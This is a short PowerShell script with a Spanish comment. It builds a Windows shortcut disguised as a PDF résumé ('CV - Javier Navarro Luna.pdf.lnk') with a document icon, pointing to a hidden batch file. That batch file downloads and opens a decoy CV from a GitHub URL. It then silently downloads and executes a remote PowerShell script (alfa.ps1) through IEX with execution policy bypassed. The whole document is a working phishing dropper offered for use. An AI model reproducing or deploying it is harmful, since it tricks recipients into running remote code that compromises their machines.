$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$pwd\CV - Javier Navarro Luna.pdf.lnk")

$Shortcut.TargetPath = "$pwd\CV - Javier Navarro Luna.pdf.bat"
$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,75"
$Shortcut.Save()

# El .bat con tu comando original (el que te funcionaba en CMD):
$bat = @'
@echo off
powershell.exe -nop -ExecutionPolicy Bypass -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/CV.pdf', '.\CV - Javier Navarro Luna.pdf')" & cmd.exe /c start "" "CV - Javier Navarro Luna.pdf" & powershell.exe -nop -ExecutionPolicy Bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/alfa.ps1')"   
'@
$bat | Out-File "$pwd\CV - Javier Navarro Luna.pdf.bat" -Encoding ASCII
